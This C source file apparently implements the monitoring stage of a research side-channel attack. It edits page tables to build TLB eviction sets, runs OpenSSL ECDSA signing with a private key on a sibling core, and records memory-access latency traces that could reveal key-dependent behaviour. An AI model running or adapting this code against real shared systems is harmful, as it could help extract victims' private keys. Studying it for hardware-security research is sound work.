#include <stdbool.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <math.h>

#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>

#include "ptedit_header.h"
#include "utils.h"

#define EV_SIZE 24
#define STEP_BIT 31
#define CENTRAL_ZERO 0x8d0

int CORE1, CORE2;

typedef struct pctrl_t {
    volatile bool start, ready;
    volatile u64 ts;
} pctrl_t;

typedef struct tlb_ev_set_t {
    u8 **pages;
    u32 size, step_bit;
    ptedit_entry_t *_pte_backup;
    bool inited;
} tlb_ev_set_t;

bool tlb_ev_set_init(tlb_ev_set_t *this, u64 addr, u32 ev_size, u32 step_bit) {
    if (ev_size < 1 || !this) {
        return true;
    }

    this->size = ev_size;
    this->step_bit = step_bit;
    u64 step = 1ul << step_bit;

    this->pages = malloc(sizeof(u8 *) * ev_size);
    this->_pte_backup = malloc(sizeof(ptedit_entry_t) * ev_size);
    if (!this->pages || !this->_pte_backup) {
        goto err;
    } else {
        memset(this->pages, 0, sizeof(u8 *) * ev_size);
        memset(this->_pte_backup, 0, sizeof(ptedit_entry_t) * ev_size);
    }

    // base page, all other pages in the ev_set will be mapped to this one
    u8 *base_page = mmap_private((void *)addr, PAGE_SIZE);
    if (!base_page) {
        goto err;
    }
    memset(base_page, 0, PAGE_SIZE);
    this->pages[0] = base_page;

    ptedit_entry_t base_pte = ptedit_resolve(this->pages[0], getpid());
    for (u32 i = 1; i < ev_size; i++) {
        u64 _addr = addr + step * i;
        u8 *page = mmap_private((void *)_addr, PAGE_SIZE);
        if (!page) {
            goto err;
        }
        memset(page, 0, PAGE_SIZE);

        ptedit_entry_t cur_pte = ptedit_resolve(page, getpid());
        this->_pte_backup[i] = cur_pte;
        cur_pte.pte = base_pte.pte;
        ptedit_update(page, getpid(), &cur_pte);
        this->pages[i] = page;
    }
    this->inited = true;
    return false;

err:
    free(this->pages);
    free(this->_pte_backup);
    this->inited = false;
    return true;
}

void tlb_ev_set_cleanup(tlb_ev_set_t *this) {
    if (!this || !this->inited) {
        return;
    }

    // restore mappings
    for (u32 i = 1; i < this->size; i++) {
        ptedit_update(this->pages[i], getpid(), &this->_pte_backup[i]);
    }

    for (u32 i = 0; i < this->size; i++) {
        munmap(this->pages[i], PAGE_SIZE);
    }
    free(this->pages);
    free(this->_pte_backup);
}


#define TANDEM_SIZE 4
int mont(char *ossl_dir) {
    volatile pctrl_t *ctrl = (pctrl_t *)mmap_shared(NULL, sizeof(pctrl_t));
    if (!ctrl) {
        return 1;
    }
    ctrl->ready = false;
    ctrl->start = false;
    ctrl->ts = 0;

    int pid = fork();
    if (pid == 0) {
        set_affinity_priority(CORE2, -20);

        const u32 CMD_SIZE = 256;
        char cmd[CMD_SIZE];

        snprintf(cmd, CMD_SIZE, "%s/openssl dgst -ecdsa-with-SHA1 -sign "
                                "%s/private.pem %s/data > /dev/null",
                                ossl_dir, ossl_dir, ossl_dir);

        ctrl->ready = true;
        while (!ctrl->start);

        UNUSED int _ = system(cmd);
        ctrl->start = false;
        _mfence();
        return 0;
    } else if (pid < 0) {
        fprintf(stderr, "Failed to fork!\n");
        return 2;
    }

    int ret = 0;
    set_affinity_priority(CORE1, -20);
    u32 central_offset = CENTRAL_ZERO;
    u64 central_index = central_offset >> 3;
    const u32 tandem = TANDEM_SIZE, ev_size = EV_SIZE;
    tlb_ev_set_t ev_sets[tandem];
#if defined(MEMJAM_DEP) || defined(MAMJAM_PARA)
    u64 addrs[] ={
        addr_crafter(0x96, 0x96, 0x96, 0x96),
        addr_crafter(0x96, 0x96, 0x96, 0x97),
        addr_crafter(0x96, 0x96, 0x97, 0x96),
        addr_crafter(0x96, 0x96, 0x97, 0x97)
    };
#else
    u64 addrs[] ={
        addr_crafter(0x96, 0x96, central_index - 2, central_index - 1),
        addr_crafter(0x96, 0x96, central_index - 1, central_index),
        addr_crafter(0x96, 0x96, central_index, central_index + 1),
        addr_crafter(0x96, 0x96, central_index + 1, central_index + 2),
    };
#endif

    for (u32 t = 0; t < tandem; t++) {
        if (tlb_ev_set_init(&ev_sets[t], addrs[t], ev_size, STEP_BIT)) {
            fprintf(stderr, "Failed to build a TLB eviction set\n");
            return 3;
        }
    }

#ifndef BLANK
#ifndef MEMJAM_DEP
    for (u32 t = 0; t < tandem - 1; t++) {
        for (u32 i = 0; i < ev_size; i++) {
            ((u64 *)(ev_sets[t].pages[i]))[i] = (u64)ev_sets[t + 1].pages[i];
        }
    }
#else
        ((u64 *)(ev_sets[0].pages[0]))[central_index + 1] = (u64)ev_sets[1].pages[0] + central_offset;
        ((u64 *)(ev_sets[1].pages[0]))[central_index] = (u64)ev_sets[2].pages[0] + central_offset - 0x8;
        ((u64 *)(ev_sets[2].pages[0]))[central_index - 1] = (u64)ev_sets[3].pages[0] + central_offset - 0x10;
#endif // MEMJAM_DEP
#endif // BLANK

    u64 size = 1ul << 18;
    u64 *tss = malloc(sizeof(u64) * size);
    u64 *lats = malloc(sizeof(u64) * size);
    if (!tss || !lats) {
        _error("Failed to allocate\n");
        ret = 1;
        goto err;
    }
    memset(tss, 0, sizeof(u64) * size);
    memset(lats, 0, sizeof(u64) * size);

    while (!ctrl->ready);
    ctrl->start = true;
    u64 iter = 0;
    usleep(50);
    while (ctrl->start) {
        u64 t_start, t_end;
        u32 i = (iter * 163) % ev_size;

        t_start = _rdtsc_google_begin();

#ifndef BLANK
#ifdef MEMJAM_DEP
        u8 *page = (u8 *)((u64 *)(ev_sets[0].pages[0]))[central_index + 1];
        page = (u8 *)((u64 *)page)[0];
        page = (u8 *)((u64 *)page)[0];
        _maccess(page);
#elif defined(MEMJAM_PARA)
        asm volatile (
            "movb 0x0000(%0), %%al\n\t"
            "movb 0x1000(%0), %%al\n\t"
            "movb 0x2000(%0), %%al\n\t"
            "movb 0x3000(%0), %%al\n\t"
            "movb 0x4000(%0), %%al\n\t"
            "movb 0x5000(%0), %%al\n\t"
            "movb 0x6000(%0), %%al\n\t"
            "movb 0x7000(%0), %%al\n\t"
            :: "r" (ev_sets[0].pages[0] + central_offset)
            : "rax", "memory"
        );
#else
        u8 *page = (u8 *)((u64 *)(ev_sets[0].pages[i]))[i];
        page = (u8 *)((u64 *)page)[i];
        page = (u8 *)((u64 *)page)[i];
        _maccess(page);
#endif // MEMJAM_PARA
#endif // BLANK
        t_end = _rdtscp_google_end();
        tss[iter % size] = t_start;
        lats[iter % size] = t_end - t_start;
        iter += 1;
    }

    u64 bound = iter > size ? size : iter;
    for (u64 i = 0; i < bound; i++) {
        printf("%lu\t%lu\n", tss[i], lats[i]);
    }

    if (iter > size) {
        fprintf(stderr, "Overflow!\n");
    }

err:
    free(tss);
    free(lats);
    for (u32 t = 0; t < tandem; t++) {
        tlb_ev_set_cleanup(&ev_sets[t]);
    }
    return ret;
}

static void segv_handler(int signum) {
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, NULL);

    ptedit_cleanup();
    fprintf(stderr, "SEGFAULT!\n");
    exit(128 + SIGSEGV);
}

int main(int argc, char **argv) {
    if (argc < 4) {
        return -1;
    }

    if (ptedit_init()) {
        return 1;
    }

    if (signal(SIGSEGV, segv_handler) == SIG_ERR) {
        fprintf(stderr, "Failed to register segfault handler\n");
        return 2;
    }

    CORE1 = atoi(argv[2]);
    CORE2 = atoi(argv[3]);

    int ret;
    if (strcmp(argv[1], "mont") == 0 && argc == 5) {
        ret = mont(argv[4]);
    } else {
        fprintf(stderr, "Unknown option %s or insufficient arguments\n", argv[1]);
        ret = 2;
    }

    ptedit_cleanup();
    return ret;
}
